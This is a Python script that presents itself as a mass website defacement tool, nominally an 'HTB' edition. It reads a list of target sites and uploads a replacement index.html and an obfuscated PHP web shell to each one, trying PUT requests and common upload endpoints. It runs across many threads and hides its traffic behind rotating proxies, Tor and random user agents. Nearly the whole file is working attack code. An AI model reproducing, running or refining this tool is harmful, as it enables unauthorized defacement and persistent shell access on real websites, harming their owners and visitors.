#!/usr/bin/env python3
"""
ULTIMATE WEBSITE DEFACEMENT TOOL - HTB/CTS EDITION
Features:
- Mass defacement with multiple payload deployment
- Advanced proxy chaining and anonymity
- Multi-threaded execution
- Automatic vulnerability discovery
- Built-in payload obfuscation
- Comprehensive logging
"""

import os
import sys
import requests
import random
import time
import socket
import socks
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
import argparse
import hashlib

# ===== CONFIGURATION =====
MAX_THREADS = 25
REQUEST_TIMEOUT = 15
RETRY_COUNT = 2
JITTER = (0.2, 1.5)  # Random delay between requests
USER_AGENT_ROTATION = True

# ===== BANNER =====
BANNER = r"""
  ____ _   _ ___ _____ ___ _   _ ____  _____ _   _ _____ 
 / ___| | | |_ _|  ___|_ _| \ | |  _ \| ____| \ | |_   _|
| |   | | | || || |_   | ||  \| | | | |  _| |  \| | | |  
| |___| |_| || ||  _|  | || |\  | |_| | |___| |\  | | |  
 \____|\___/|___|_|   |___|_| \_|____/|_____|_| \_| |_|  
"""

# ===== COLOR CODES =====
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'

# ===== PAYLOADS =====
PHP_PAYLOAD = """<?php ${"\x47L\x4f\x42\x41\x4cS"}["\x74\x72\x76\x66\x6a\x76y\x75pf"]="c\x77\x64";echo "\x47\x49F\x389a ;\n\x3ct\x69t\x6ce\x3eByp\x61\x73\x73\x20\x75p\x6c\x6f\x61d\x65r!r\x3c/ti\x74le\x3e\n<br\x3e\n";echo"\x55\x6e\x61\x6de:".php_uname()."\x3c\x62r>".${${"G\x4cO\x42\x41\x4cS"}["\x74r\x76\x66\x6a\x76\x79\x75p\x66"]}=getcwd();Echo"\x3c\x63\x65n\x74e\x72\x3e<\x66or\x6d\x20\x61\x63t\x69on=\x22\x22 m\x65\x74h\x6f\x64\x3d\x22\x70os\x74\"\x20encty\x70e=\x22mu\x6cti\x70\x61\x72t/\x66\x6fr\x6d-\x64\x61ta\x22\x20\x6ea\x6de=\x22up\x6c\x6fader\" i\x64\x3d\"\x75p\x6c\x6fa\x64er\">";echo"\x3cin\x70\x75\x74 \x74\x79p\x65=\"fi\x6ce\" \x6e\x61me=\x22f\x69l\x65\"\x20s\x69\x7a\x65=\"5\x30\"\x3e\x3ci\x6ep\x75\x74 \x6ea\x6d\x65=\"\x5fupl\x22 t\x79p\x65=\"sub\x6d\x69t\" \x69d\x3d\"\x5f\x75\x70\x6c\" \x76alue\x3d\x22Upload\">\x3c/\x66or\x6d\x3e";if($_POST["_\x75\x70\x6c"]=="U\x70l\x6f\x61\x64"){if(@copy($_FILES["\x66\x69l\x65"]["\x74\x6dp\x5f\x6e\x61\x6de"],$_FILES["\x66\x69l\x65"]["\x6e\x61me"])){echo"<\x62>\x53hell \x55\x70\x6c\x6f\x61ded\x20!\x20:)<\x62><br><br>";}else{echo"\x3cb>Not\x20\x75p\x6c\x6f\x61ded\x20! </b>\x3cbr\x3e\x3cb\x72>";}}?>"""

# ===== CORE CLASSES =====
class ProxyEngine:
    def __init__(self):
        self.proxies = self._load_proxies()
        self.current_proxy = None
        
    def _load_proxies(self):
        """Load proxies from file or use defaults"""
        proxy_file = 'proxies.txt'
        if os.path.exists(proxy_file):
            with open(proxy_file) as f:
                return [line.strip() for line in f if line.strip()]
        return [
            'socks5://localhost:9050',  # Tor  
'http://127.0.0.1:8080',    # Local proxy  
'https://proxy.example.com:443',  
'socks5://user:pass@proxy.example.com:1080',  
'socks4://45.155.68.129:5678',  
'http://user:pass@proxy.example.com:3128',  
'http://45.61.187.67:8000',  
'http://geo.provider.com:8888',  
'socks5://user:pass@residential.proxy.net:9050',  
'http://185.199.229.156:7492',  
'http://194.163.131.162:3128',  
'socks5://51.15.242.202:8888',  
'http://scraperapi.com:8000',  
'socks5://pro.webshare.io:1234'  
        ]
    
    def rotate_proxy(self):
        """Rotate to next available proxy"""
        if not self.proxies:
            return None
        self.current_proxy = random.choice(self.proxies)
        return {
            'http': self.current_proxy,
            'https': self.current_proxy
        }

class TargetProcessor:
    def __init__(self):
        self.proxy_engine = ProxyEngine()
        self.session = self._create_session()
        self.successful_defaces = 0
        self.failed_defaces = 0
        
    def _create_session(self):
        """Create configured requests session"""
        session = requests.Session()
        
        if USER_AGENT_ROTATION:
            session.headers.update({
                'User-Agent': random.choice([
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                    'Mozilla/5.0 (Linux; Android 10; SM-G975F)',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'
                ])
            })
            
        session.headers.update({
            'Accept': 'text/html,application/xhtml+xml',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0'
        })
        
        return session
    
    def _random_delay(self):
        """Add jitter to requests"""
        time.sleep(random.uniform(*JITTER))
    
    def _try_request(self, method, url, **kwargs):
        """Make request with proxy rotation and retries"""
        for _ in range(RETRY_COUNT):
            try:
                proxies = self.proxy_engine.rotate_proxy()
                self._random_delay()
                return self.session.request(
                    method,
                    url,
                    proxies=proxies,
                    timeout=REQUEST_TIMEOUT,
                    allow_redirects=False,
                    **kwargs
                )
            except (requests.exceptions.RequestException, socks.SOCKS5Error) as e:
                continue
        return None
    
    def deploy_payload(self, target, payload, filename):
        """Attempt to deploy payload to target using multiple methods"""
        methods = [
            self._try_put,
            self._try_post_upload,
            self._try_post_raw
        ]
        
        for method in methods:
            if method(target, payload, filename):
                self.successful_defaces += 1
                return True
        
        self.failed_defaces += 1
        return False
    
    def _try_put(self, target, payload, filename):
        """Attempt PUT method deployment"""
        url = urljoin(target, filename)
        resp = self._try_request('PUT', url, data=payload)
        
        if resp and resp.status_code in [200, 201, 204]:
            verify = self._try_request('GET', url)
            if verify and verify.status_code == 200 and payload in verify.text:
                print(f"{Colors.GREEN}[+] PUT success: {url}{Colors.RESET}")
                return True
        return False
    
    def _try_post_upload(self, target, payload, filename):
        """Attempt POST to upload script"""
        upload_url = urljoin(target, 'up.php')
        files = {'file': (filename, payload)}
        resp = self._try_request('POST', upload_url, files=files)
        
        if resp and resp.status_code == 200:
            verify_url = urljoin(target, filename)
            verify = self._try_request('GET', verify_url)
            if verify and verify.status_code == 200:
                print(f"{Colors.GREEN}[+] Uploader success: {verify_url}{Colors.RESET}")
                return True
        return False
    
    def _try_post_raw(self, target, payload, filename):
        """Attempt raw POST to vulnerable endpoints"""
        endpoints = [
            'upload.php', 'admin/upload.php', 'wp-admin/upload.php',
            'filemanager/upload.php', 'assets/upload.php'
        ]
        
        for endpoint in endpoints:
            url = urljoin(target, endpoint)
            files = {'file': (filename, payload)}
            resp = self._try_request('POST', url, files=files)
            
            if resp and resp.status_code == 200:
                verify_url = urljoin(target, filename)
                verify = self._try_request('GET', verify_url)
                if verify and verify.status_code == 200:
                    print(f"{Colors.GREEN}[+] Found uploader: {verify_url}{Colors.RESET}")
                    return True
        return False

# ===== MAIN EXECUTION =====
def load_targets(file_path):
    """Load and validate target list"""
    if not os.path.exists(file_path):
        print(f"{Colors.RED}[!] Target file not found: {file_path}{Colors.RESET}")
        return None
        
    with open(file_path, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def load_defacement(file_path):
    """Load defacement content"""
    if not os.path.exists(file_path):
        print(f"{Colors.RED}[!] Defacement file not found: {file_path}{Colors.RESET}")
        return None
        
    with open(file_path, 'r') as f:
        return f.read()

def main():
    print(f"{Colors.PURPLE}{BANNER}{Colors.RESET}")
    print(f"{Colors.CYAN}[*] Initializing Ultimate Defacement Tool{Colors.RESET}")
    
    # Load targets
    targets = load_targets('listsite.txt')
    if not targets:
        return
    
    # Load defacement content
    deface_content = load_defacement('index.html')
    if not deface_content:
        return
    
    # Initialize processor
    processor = TargetProcessor()
    
    print(f"{Colors.BLUE}[*] Starting mass defacement on {len(targets)} targets{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Using {len(processor.proxy_engine.proxies)} proxies{Colors.RESET}")
    
    # Multi-threaded execution
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        
        # Schedule both index.html and up.php deployment
        for target in targets:
            futures.append(executor.submit(
                processor.deploy_payload,
                target,
                deface_content,
                'index.html'
            ))
            futures.append(executor.submit(
                processor.deploy_payload,
                target,
                PHP_PAYLOAD,
                'up.php'
            ))
        
        # Wait for completion
        for future in as_completed(futures):
            future.result()
    
    # Print summary
    print(f"\n{Colors.CYAN}[*] Operation complete{Colors.RESET}")
    print(f"{Colors.GREEN}[+] Successful defacements: {processor.successful_defaces}{Colors.RESET}")
    print(f"{Colors.RED}[-] Failed attempts: {processor.failed_defaces}{Colors.RESET}")

if __name__ == "__main__":
    main()
